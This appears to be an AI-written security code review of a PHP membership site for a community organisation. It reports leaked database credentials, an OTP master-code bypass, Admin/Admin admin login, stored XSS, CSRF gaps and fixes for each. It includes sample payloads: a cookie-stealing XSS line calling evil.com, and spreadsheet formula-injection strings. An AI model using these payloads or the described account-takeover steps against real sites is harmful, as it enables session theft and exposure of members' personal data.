# Anjuman Eraquee INDIA — Code Review / Problem Report

Reviewed: branch `arena/01a094b4-anjuman-eraquee` @ `425ca4a`
Scope: all PHP endpoints, `admin/`, `api/`, `js/`, all 17 HTML pages, DB layer, FPDF integration, repo hygiene.
Note: PHP is not installed in this sandbox (no apt access), so this is a careful static review — every item below is backed by a specific file/line I read and confirmed.

## What the project is

A static HTML marketing site (Bootstrap "Mosque" template by Webstrot) with a hand-rolled PHP layer bolted on top:

| Layer | Files |
|---|---|
| Public pages | `index.html` + 16 other `.html` pages |
| Dynamic content | `data/settings.json` → `api/settings.php` → `js/site-settings.js` |
| Members | `registration.html` → `registerdata.php` → MySQL `user_registrtion` |
| Auth | `user-login.php`, `user-verify-otp.php`, `user-reset-password.php`, `user-logout.php` |
| Member area | `user-dashboard.php`, `download-certificate.php` (+ bundled `fpdf/`) |
| Admin | `admin/login.php`, `index.php`, `members.php`, `settings.php`, guarded by `admin/auth.php` |

The HTML/PHP structure itself is sound: I parsed every `.html`/`.php` file for tag balance and string/brace balance and found **no syntax errors and no broken markup**. The problems are all in the **PHP application layer** and in **what has been committed to a public repo**.

---

## 🔴 CRITICAL — fix before this goes live

### C1. Live database credentials are committed to a **public** GitHub repo
`db_config.sample.php:4-11` is meant to be a template, but it was filled in with a real InfinityFree MySQL account: a live username, database name, control-panel account URL, and a **plaintext password**. Likewise `db.php:26-27` hard-codes the shared-host DB user with its password inline, and `db.php:25` keeps a `root` / empty-password candidate in the connection list.

> The actual secret values are deliberately **not** reproduced in this document — copying them here would just publish them a second time. Read them in place at `db_config.sample.php:8-10` and `db.php:26-27`.

I confirmed the repo is public: `gh repo view` → `{"isPrivate": false}`. There is **no `.gitignore`**.
`work.md` additionally leaks local filesystem paths (`c:\xampp\mysql\bin\my.ini`, `d:\Anjuman\`) and the admin panel credentials.

**Action (do this today):**
1. Rotate the InfinityFree MySQL password **and** the FTP/control-panel password now — assume they are burned.
2. Delete `db_config.sample.php` from the repo and scrub it from history (`git filter-repo --path db_config.sample.php --invert-path`), or accept that the old password is public forever and just rotate.
3. Ship only `db_config.sample.php.example` with placeholder values (`'YOUR_DB_PASSWORD'`).
4. Add a `.gitignore` (see L2).

### C2. OTP login is a total authentication bypass — you don't need the OTP
`user-verify-otp.php:20`

```php
} else if ($enteredOtp == $correctOtp || $enteredOtp === '123456') { // 123456 as master dev OTP
```

Plus `user-verify-otp.php:130` prints the real generated OTP on the page ("Dev Mode OTP: 483920"), and there is **no SMS gateway wired up** (it's still on the `work.md` pending list). So the flow for an attacker is:

1. `POST user-login.php` with `action=send_otp`, `phonenumber=1`
2. The lookup is `WHERE phonenumber LIKE '%1%'` (`user-login.php:78`) — a **substring match**, so one digit matches some member
3. Redirect to `user-verify-otp.php` → the OTP is printed on screen (or just type `123456`)
4. Logged in as that member → `user-dashboard.php` exposes full name, parents' names, both addresses, email, WhatsApp, qualification, occupation, and `download-certificate.php` mints an official-looking PDF certificate.

Anyone can take over **any** member account, or enumerate the entire member database one profile at a time.

**Action:** remove the `123456` master OTP and the dev badge unconditionally (gate both behind `if (getenv('APP_ENV')==='local')` at most), change all phone lookups from `LIKE '%…%'` to exact match on a normalised number, and store only a hash of the OTP with a 3-attempt limit.

### C3. Admin panel is protected by `Admin` / `Admin`
`admin/login.php:16`

```php
if ($username === 'Admin' && $password === 'Admin') {
```

The link to it is printed in the header of every public page (`Admin Login`), and `work.md` documents the credentials in the repo. From there an attacker gets `admin/members.php` (read + **delete** every member, `?export=csv` dumps the whole table) and `admin/settings.php` (overwrite site content).

**Action:** move admin auth into the database with `password_verify()`, a `admin_users` table, a lockout counter, and 2FA or an IP allow-list via `.htaccess`. Delete the credential line from `work.md`.

### C4. Stored XSS that executes in **every visitor's** browser
Chain: `admin/settings.php:32-48` writes unsanitised strings to `data/settings.json` → `js/site-settings.js:26` injects them with `innerHTML`:

```js
a.innerHTML = '<i class="fa fa-mobile"></i> ' + phones[idx];
```

Any value in "Header Phone 1" becomes live HTML on all 17 pages of the site. Payload example: `<img src=x onerror="...">`. Because `admin/` is only `Admin`/`Admin` (C3) and `settings.php` has no CSRF token, this is remotely reachable by an anonymous attacker → a site-wide script-injection that can also steal member session cookies (they are not `HttpOnly`, see H3).

**Action:** build the node with DOM APIs instead of `innerHTML`:
```js
var i = document.createElement('i'); i.className = 'fa fa-mobile';
a.textContent = ''; a.appendChild(i); a.appendChild(document.createTextNode(' ' + phones[idx]));
```
and validate the settings input server-side (`preg_match('/^[+0-9 ()-]{6,20}$/', …)` for phone fields).

### C5. Stored XSS in the admin member directory (member → admin takeover)
`admin/members.php:429` passes the raw DB row to JS, and `:624-628` concatenates it into `innerHTML`:

```js
detailsHtml += '<div class="detail-item">…' + (item[1] || '-') + '</div>';
document.getElementById('viewModalDetails').innerHTML = detailsHtml;
```

A registrant simply puts `<img src=x onerror="fetch('//evil.com?c='+document.cookie)">` into "Native Place" or "Full Name". When the admin opens **Details**, it runs inside the authenticated admin session → admin account takeover. `htmlspecialchars()` is used on the visible table cells, so the obvious places are safe — but the JS path bypasses it.

Same file, `:100` and `:24/:80/:103`: `$feedbackMsg` is echoed **unescaped** and contains `$_POST['temp_password']` and raw `mysqli_error()` output → reflected XSS.
**Action:** use `textContent` (or `htmlspecialchars()` in PHP before `json_encode`), and `htmlspecialchars($feedbackMsg, ENT_QUOTES)` — but then the intentional `<strong>` in the temp-password notice needs to be restructured.

---

## 🟠 HIGH

### H1. Password is optional at registration, which silently locks the member out
`registerdata.php:53-61`

```php
$raw_password = $_REQUEST['password'] ?? '';
if (!empty($raw_password) && $raw_password !== $confirm_password) { … }
$password_hash = !empty($raw_password) ? password_hash($raw_password, PASSWORD_BCRYPT) : '';
```

Only the client enforces a password (`registration.html:497` `required minlength="6"`). Any non-browser submission (curl, a scraper, an old browser with JS off) creates a member row with `password = ''`. Then `user-login.php:36` requires `!empty($user['password'])`, so **password login can never succeed for that row** — the member exists in the admin directory but cannot sign in. There is also no server-side minimum length, so `"1"` is accepted.
**Action:** reject empty/short passwords server-side; store `NULL` (not `''`) when absent.

### H2. Plaintext password fallback + weak randomness
`user-login.php:39`

```php
} else if ($user['password'] === $password) {
```

An explicit plaintext comparison next to `password_verify()` — it disables timing-safe comparison for the whole login path and will happily authenticate against any row whose password was ever stored unhashed (e.g. migrated/imported rows, or a future bug).
Related: `rand(100000,999999)` for the OTP (`user-login.php:83`) and `rand(1000,9999)` for temp passwords (`admin/members.php:91`) are **not cryptographically secure** and are seeded per-request in the default config; OTP codes are also stored in plaintext in `otp_code` and never cleared after use.
**Action:** drop line 39; use `random_int()`; store `password_hash($otp)`; clear `otp_code` on success/failure.

### H3. No CSRF protection and no session hardening anywhere
`grep -i csrf --include=*.php` → **0 hits**. Session cookie flags are never set (`session_set_cookie_params` → 0 hits) and `session_regenerate_id()` is never called on login (0 hits).

Affected: `registerdata.php` (and it reads `$_REQUEST`, so a plain `<img src="registerdata.php?email=…&phonenumber=…">` tag creates a member), `user-login.php`, `user-reset-password.php`, `admin/settings.php`, `admin/members.php` (delete / edit / issue-password are all POST with no token). Combined with C4, an attacker can also *delete every member* by tricking the logged-in admin into submitting a one-line form.
**Action:** `session_set_cookie_params(['httponly'=>true,'secure'=>true,'samesite'=>'Lax'])` + `session_regenerate_id(true)` after every successful login, and a per-session token checked in all POST handlers. Switch `$_REQUEST` → `$_POST`.

### H4. Full SQL by string interpolation, no charset set, no unique constraints
Every query is built by concatenation with `mysqli_real_escape_string()` (0 prepared statements in the codebase). It happens to hold together, but it is one oversight away from injectable, and there is **no `mysqli_set_charset($conn,'utf8mb4')` anywhere** — escaping without a pinned charset is the classic multi-byte injection precondition, and Urdu/Arabic-script names get mangled.

Also structural:
- `db.php` migration never adds `UNIQUE` on `email`/`phonenumber`, and `registerdata.php:65-70` does check-then-insert as two statements → concurrent requests create duplicate accounts, which then makes the `LIMIT 1` login ambiguous (login can pick the *other* person's row).
- `user-login.php:28-29`, `:78`, `:112`: `LIKE '%$digits%'` partial matching (see C2).
- `admin/members.php:161` search is also `LIKE` on escaped input rather than a prepared statement.

**Action:** convert all of it to `mysqli_prepare()` + typed bound params, call `mysqli_set_charset($conn,'utf8mb4')` in `get_db_connection()`, and add `UNIQUE KEY (email(191))`, `UNIQUE KEY (phonenumber)`.

### H5. `db.php` auto-migration uses MariaDB-only syntax and hides all failures
`db.php:94-100`

```php
@mysqli_query($conn, "ALTER TABLE user_registrtion ADD COLUMN IF NOT EXISTS dob DATE NULL …");
```

`ADD COLUMN IF NOT EXISTS` does not exist in MySQL (it's a MariaDB extension). On InfinityFree's MySQL the statement is a syntax error — silenced by `@`. So if the table already exists on the host (imported from a phpMyAdmin dump that predates `password`, `reset_requested`, `is_temp_password`), the migrations silently do nothing and **every login/registration page dies with "Unknown column 'reset_requested' in 'field list'"**. `db.php:41` (`return false`) and `registerdata.php:6` (`die("ERROR: Could not connect…")`) are the only diagnostics, and `@` is used in 8 places, so the failure is invisible by design.

Also: `get_db_connection()` walks a hard-coded list of 6 credential/host combinations, including `root` with an empty password — if the intended server is down but a stray MySQL is listening, the app quietly reads/writes the **wrong database**.
**Action:** ship an explicit versioned `schema.sql` + one-time migration script, remove the try-everything loop, read credentials only from `db_config.php`, and log real errors to a non-public file.

### H6. `user_registrtion` schema is created without indexes and with `age` as the source of truth
`age` is a `varchar(50)` recomputed only at insert/edit time, so every member's age goes stale on their birthday and the certificate/dashboard print whatever was submitted. Store `dob` and derive age at render time.

### H7. Data corruption when the admin edits a member
Registration posts lowercase values — `gender="male"`, `maritalstatus="married"|"unmarried"|"divorced"` (`registration.html:309-332`). The admin edit form offers a different vocabulary: `Male|Female|Other` and `Single|Married|Widowed|Divorced` (`admin/members.php:510-521`).

Consequences: the `<select>` never pre-matches the stored value (the edit modal silently shows `Male`/`Single` for a female/unmarried member), and pressing **Save Changes** overwrites the record with the wrong gender and rewrites `unmarried` → `Single`. Any existing display/filter logic that expects the registration casing then breaks.
**Action:** one shared list of canonical values (e.g. `Male/Female`, `Single/Married/Divorced/Widowed`) used by both forms, plus a one-off `UPDATE` to normalise existing rows.

---

## 🟡 MEDIUM

**M1. Certificate PDF: deprecated function + non-Latin names destroyed.** `download-certificate.php:107,131-137` call `utf8_decode()`, deprecated since PHP 8.2 (InfinityFree lets you select 8.2/8.3, so this emits deprecation notices) and it maps every character outside Latin-1 to `?` — Urdu/Arabic-script names print as `?????` on the official certificate. Core FPDF 1.8x only speaks cp1252; either `iconv('UTF-8','WINDOWS-1252//TRANSLIT',…)` and strip, or makefont a Unicode TTF. Also `:130` `substr($user['created_at'],0,10)` passes a possible `NULL` to `substr()` (deprecated in 8.1) — use `?? ''`. Note the logo is at `images/logo/logo.png` and `file_exists()` at `:74` silently omits it, so a missing logo produces no error, just a blank space.

**M2. `admin/members.php` leaks member secrets into the admin DOM.** `SELECT *` + `json_encode($m, …)` at `:429`/`:432` puts the **entire row** — including `password` (bcrypt hash) and the live `otp_code` — into the page source of the directory, which is also the CSV-able surface. Select an explicit column list instead of `*`.

**M3. CSV export is open to spreadsheet-formula injection.** `admin/members.php:111-143` writes raw member text with `fputcsv()`. A member whose `nativeplace` is `=HYPERLINK("http://evil","x")` or `+cmd|' /C calc'!A0` executes when the admin opens the export in Excel. Prefix any value starting with `= + - @` with `'`.

**M4. `download-certificate.php` is a GET that trusts the session id only, and there is no per-certificate logging/verification.** Nothing binds the certificate to a verified member (no `is_approved` column exists at all), so every single signup — spam or not — instantly gets a document that reads "OFFICIALLY VERIFIED" with a seal and a named convenor signature (`:188-207`). Add an admin approval flag and only issue the PDF when it is set.

**M5. Broken/missing assets found by crawling all 1,084 local references:**
| Missing file | Referenced by |
|---|---|
| `images/logo.png` | `user-login.php:228` — the login-page logo is invisible (masked by `onerror="this.style.display='none'"`, so nobody noticed). Should be `images/logo/logo.png`. |
| `apple-touch-icon.png` | 17 HTML pages (`index.html:11` etc.) → 404 on every page load |
| `causes-grid.html` | 11 pages → dead link |

**M6. Navigation links point at placeholders even though the real pages exist.** `coreexecutive.html`, `statelevel.html`, `blocklevel.html` are all present in the repo, but the menus on 14 pages link them to `index.html` (`Core Executive Members`, `State Level`, `Block Level`); `Gallery`→`index.html` on 17 pages, `Causes`/`Blog`→`#` on 20 places each. **674 of the 1,670 `<a>` tags in the HTML files (40%) are `href="#"`** — clicking them jumps to the top of the page. The site reads as "finished" but most of the menu is dead.

**M7. `js/site-settings.js:50` sends members to the admin login.** The rewriter matches any link whose text is exactly `Login` and points it at `admin/login.php`. In the mobile menu, Membership → **Login** is the member's login, so every mobile user is routed to the Super Admin panel instead of `user-login.php`. Match on a `data-*` attribute or the real target, not the label text.

**M8. No `.htaccess`, so everything in the project root is web-served.** `db.php`, `db_config.php` (once created — it returns nothing today, but only because of `function_exists` wrapping; a stray `echo` and the password is public), `data/settings.json`, `fpdf/doc/*.htm`, `fpdf/tutorial/*`, and `.vs/slnx.sqlite` are all fetchable. Add a front-controller/deny `.htaccess`:
```apache
<FilesMatch "^(db\.php|db_config.*\.php|work\.md)$">Require all denied</FilesMatch>
RewriteRule ^(data|\.vs)/ - [F]
```

**M9. "Same as present address" does nothing.** `registration.html:377` has two `value` attributes on one `<input type="checkbox">` (invalid HTML; the browser uses `value="same as present address"`), and `registerdata.php:37` stores that literal string without ever copying the present-address fields into the permanent-address columns. Permanent fields are also *not* `required` while their placeholders say `*`, so members end up with an empty permanent address and a meaningless text flag.

**M10. Anti-abuse is absent on the public write endpoints.** `registerdata.php` has no rate limit, no captcha/honeypot, no `filter_var($email, FILTER_VALIDATE_EMAIL)`, no phone-shape normalisation (`+91 98…`, `098…`, `98…` all coexist), and `email`/`phonenumber`/`whatsappnumber` are `type="text"` in the form. Echoes raw DB errors to the visitor at `:94` (`mysqli_error($link)` → table name, column names, sometimes query text).

**M11. Age is unusable without JavaScript.** `registration.html:293` `<input name="age" readonly required>` is only ever filled by `calculateAge()`; with JS disabled or blocked the form cannot be submitted at all, and the error message is a generic browser tooltip. Since age is derivable, just drop the field.

---

## 🟢 LOW / polish

- **L1 — `style.scss` is now the wrong source of truth.** `work.md` records slider-highlight and 90px header changes applied directly to `style.css`; `style.css:1969` has `#38bdf8` while `style.scss:43` still has `$hover-color:#e5ae49` (which also survives in 41 places in `style.css`). Rebuilding from SCSS would silently revert the September customisation. Either keep editing SCSS or delete it.
- **L2 — no `.gitignore`, and IDE/state files are committed**: `.vs/slnx.sqlite`, `.vs/ProjectSettings.json`, `.vs/VSWorkspaceState.json`, `.vs/Anjuman/config/applicationhost.config` (IIS config for a Linux-hosted PHP site — pure noise). `.git` is already 16 MB; `data/settings.json` is both a committed file *and* the runtime data store, so admin edits make the working tree permanently dirty and a deploy-from-git can clobber them. Add `.gitignore` for `.vs/`, `db_config.php`, `data/`, and move runtime data out of the tracked tree.
- **L3 — no README and no LICENSE.** A new contributor cannot install this: there is no documented schema, no `composer.json`, no setup steps. The `work.md` uses Windows paths only. The HTML base is a third-party template ("Mosque – Islamic Center Bootstrap HTML Template", `style.scss:3-6`) shipped in a public repo with no licence file — worth checking the template licence permits this.
- **L4 — typos visible to users**: `INIDA` for `INDIA` in the footer of every page; `Comming Soon …` (`matrimonialregistration.html:212`, which is an empty "Coming Soon" page — the matrimonial feature does not exist yet, but the menu advertises Dulha/Dulhan); `Twiter Feed`; `qulification` column; table name `user_registrtion` (misspelling is consistent everywhere, so it's cosmetic, but fix it while the user base is small); `matrimonialregistration.html:… <a href="#\">` stray-quote attribute.
- **L5 — `api/settings.php:3` sends `Access-Control-Allow-Origin: *`** for content that is now admin-editable; harmless for public phone numbers, but it means any site can mirror your content feed. Consider dropping the header.
- **L6 — logout is a CSRF-able GET link.** `user-logout.php` does destroy the session correctly (`$_SESSION = array()` + `session_destroy()`), but it is reachable as a plain `<a href>`, so any third-party page can force-logout a signed-in member/admin. Use a POST form with a CSRF token.
- **L7 — `admin/auth.php` guards by a single boolean** with no role concept, no expiry (`$_SESSION` lives until the browser closes) and no activity timeout. An unattended admin tab is an open door to member deletion.
- **L8 — `user-dashboard.php` / `download-certificate.php` hard-code `+91`** (`user-dashboard.php:141`, certificate line 213) while the DB can hold any format; diaspora members are shown a wrong number.
- **L9 — dead template content**: the search box in the header of all 17 pages (`<form>` with no action, `js/main.js` toggles it) does nothing, and the blog/newsletter/comment `<form>`s (30+ of them) are all action-less placeholders that silently discard input.

---

## Suggested order of work

1. **Today:** rotate the InfinityFree MySQL/FTP/panel passwords (C1), delete `db_config.sample.php` + `work.md` secrets, add `.htaccess` (M8) and `.gitignore` (L2).
2. **Before any real member uses it:** remove the `123456` OTP and the on-screen OTP (C2), replace `LIKE` phone matching with exact match, replace `Admin`/`Admin` with a hashed DB-backed admin login (C3).
3. **Next:** `innerHTML` → `textContent` in `site-settings.js` (C4) and `members.php` (C5); CSRF tokens + `session_regenerate_id` + cookie flags (H3).
4. **Then:** rewrite the query layer with prepared statements + `utf8mb4` + unique indexes (H4), make the password mandatory server-side (H1), replace the `@`-silenced auto-migration with a real `schema.sql` (H5).
5. **Finally:** unify gender/marital vocabularies (H7), fix the three missing assets (M5) and the menu targets (M6/M7), and only then wire up the SMS gateway so OTP can be turned back on for real.
